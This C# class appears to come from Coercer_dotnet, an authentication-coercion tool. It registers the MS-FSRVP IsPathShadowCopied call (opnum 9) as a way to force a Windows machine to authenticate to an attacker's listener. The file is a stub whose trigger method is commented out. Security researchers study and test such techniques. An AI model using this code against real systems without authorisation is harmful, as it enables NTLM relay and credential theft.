using Coercer_dotnet.structures;

namespace Coercer_dotnet.methods.MS_FSRVP
{
    public class IsPathShadowCopied : MS_FSRVP
    {
        public IsPathShadowCopied(AuthType authType, string listener) : base(authType, listener) { }
        public IsPathShadowCopied(AuthType authType, string listener, int port) : base(authType, listener, port) { }
        public IsPathShadowCopied(AuthType authType, string listener, int httpPort, int smbPort) : base(authType, listener, httpPort, smbPort) { }
        public override string Description => "Coercing a machine to authenticate using function IsPathShadowCopied (opnum 9) of [MS-FSRVP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b)";
        public override Function Function => new("IsPathShadowCopied", 9, new[] { "ShareName" });

        // public override void Trigger() { }
    }
}